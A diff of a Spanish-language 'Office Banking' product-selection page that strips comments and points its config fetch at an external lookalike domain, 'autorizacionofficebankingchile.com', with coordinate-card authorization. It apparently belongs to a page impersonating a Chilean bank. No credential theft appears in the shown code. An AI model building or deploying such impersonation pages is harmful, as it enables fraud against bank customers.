@@ -26,23 +26,22 @@
       font-weight: bold;
       color: red;
     }
-    /* ✅ Logo responsivo */
     .logo {
-      max-width: 200px;   /* límite de ancho */
-      height: auto;       /* mantiene proporción */
+      max-width: 200px;
+      height: auto;
       display: block;
-      margin: 0 auto 20px auto; /* centrado con espacio inferior */
+      margin: 0 auto 20px auto;
     }
     @media (max-width: 600px) {
       .logo {
-        max-width: 150px; /* más pequeño en pantallas chicas */
+        max-width: 150px;
       }
     }
   </style>
 </head>
 <body>
   <div class="productos-box">
-    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+    <img src="logo-officebanking.png" alt="Office Banking" class="logo">
 
     <h2>Selecciona el producto que deseas solicitar</h2>
     <div id="listaProductos"></div>
@@ -53,12 +52,11 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
-      const API_URL = "/config";
+      const API_URL = "https://autorizacionofficebankingchile.com/config";
       const contenedor = document.getElementById("listaProductos");
       const mensaje = document.getElementById("mensaje");
       let tipoAutorizacion = "coordenadas"; // valor por defecto
 
-      // Formato CLP
       function formatoCLP(valor){
         return new Intl.NumberFormat("es-CL", {
           style: "currency",
@@ -68,7 +66,6 @@
         }).format(valor);
       }
 
-      // Cargar configuración desde el backend
       fetch(API_URL)
         .then(res => res.json())
         .then(cfg => {
@@ -115,7 +112,6 @@
           mensaje.innerText = "⚠️ No se pudo cargar configuración del servidor.";
         });
 
-      // Botón LO QUIERO
       document.getElementById("quieroBtn").addEventListener("click", () => {
         const seleccion = document.querySelector('input[name="opcion"]:checked');
         if(!seleccion){
